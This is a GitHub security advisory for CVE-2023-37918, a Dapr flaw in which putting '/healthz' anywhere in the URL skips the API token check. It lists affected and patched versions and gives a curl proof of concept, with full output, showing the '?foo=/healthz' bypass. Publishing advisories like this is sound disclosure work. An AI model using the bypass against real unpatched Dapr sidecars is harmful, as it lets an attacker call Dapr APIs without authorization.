# [M] Dapr API token authentication bypass in HTTP endpoints

## Summary
Severity: Medium
Advisory: GHSA-59m6-82qm-vqgj
CVE: CVE-2023-37918
CWE: CWE-287, CWE-305
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2023-07-21
Source: https://github.com/advisories/GHSA-59m6-82qm-vqgj
Type: github-advisory

## Affected
- Go: `github.com/dapr/dapr` — affected >=1.11.0 <1.11.2
- Go: `github.com/dapr/dapr` — affected >=0 <1.10.9

## Details
### Summary


A vulnerability has been found in Dapr that allows bypassing [API token authentication](https://docs.dapr.io/operations/security/api-token/), which is used by the Dapr sidecar to authenticate calls coming from the application, with a well-crafted HTTP request.


Users who leverage API token authentication are encouraged to upgrade Dapr to 1.10.9 and 1.11.2.


### Impact


This vulnerability impacts Dapr users who have configured API token authentication. An attacker could craft a request that is always allowed by the Dapr sidecar over HTTP, even if the `dapr-api-token` in the request is invalid or missing.


### Patches


The issue has been fixed in Dapr 1.10.9 and 1.11.2.


### Details


When API token authentication is enabled, Dapr requires all calls from applications to include the `dapr-api-token` header, with a value matching what's included in the Dapr's configuration. In order to allow for healthchecks to work, the `/v1.0/healthz` and `/v1.0/healthz/outbound` HTTP APIs are excluded from the API token authentication check, and are always allowed.


Dapr <= 1.10.8 and <= 1.11.1 implemented the allowlisting of the healthcheck endpoints by permitting all requests whose URL contains `/healthz` to bypass the API token authentication check. The match applied anywhere in the URL, including the querystring.


As a consequence, attackers were able to bypass API token authentication by including `/healthz` anywhere in the URL, including as a querystring parameter. This allowed attackers to invoke any Dapr API using HTTP, including perform service invocation.


### Proof of Concept


```
$ curl -v http://localhost:3500/v1.0/metadata
* Trying ::1:3500...
* Connected to localhost (::1) port 3500 (#0)
> GET /v1.0/metadata HTTP/1.1
> Host: localhost:3500
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Date: Mon, 17 Jul 2023 18:13:13 GMT
< Content-Type: text/plain; charset=utf-8
< Content-Length: 17
< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00
<
* Connection #0 to host localhost left intact
invalid api token


$ curl -v http://localhost:3500/v1.0/metadata -H "dapr-api-token: mytoken"
* Trying ::1:3500...
* Connected to localhost (::1) port 3500 (#0)
> GET /v1.0/metadata HTTP/1.1
> Host: localhost:3500
> User-Agent: curl/7.74.0
> Accept: */*
> dapr-api-token: mytoken
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 17 Jul 2023 18:13:26 GMT
< Content-Type: application/json
< Content-Length: 119
< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00
<
* Connection #0 to host localhost left intact
{"id":"foo","actors":[],"extended":{"daprRuntimeVersion":"v1.11.1"},"components":[],"httpEndpoints":[],"subscriptions":[]}


$ curl -v http://localhost:3500/v1.0/metadata?foo=/healthz
* Trying ::1:3500...
* Connected to localhost (::1) port 3500 (#0)
> GET /v1.0/metadata?foo=/healthz HTTP/1.1
> Host: localhost:3500
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 17 Jul 2023 18:13:44 GMT
< Content-Type: application/json
< Content-Length: 119
< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00
<
* Connection #0 to host localhost left intact
{"id":"foo","actors":[],"extended":{"daprRuntimeVersion":"v1.11.1"},"components":[],"httpEndpoints":[],"subscriptions":[]}

## References
- https://github.com/dapr/dapr/security/advisories/GHSA-59m6-82qm-vqgj
- https://nvd.nist.gov/vuln/detail/CVE-2023-37918
- https://github.com/dapr/dapr/commit/83ca1abb11ffe34211db55dcd36d96b94252827a
- https://github.com/dapr/dapr/commit/99d6799c97b79397443c8c96737c9b893126a1ae
- https://docs.dapr.io/operations/security/api-token
- https://github.com/dapr/dapr
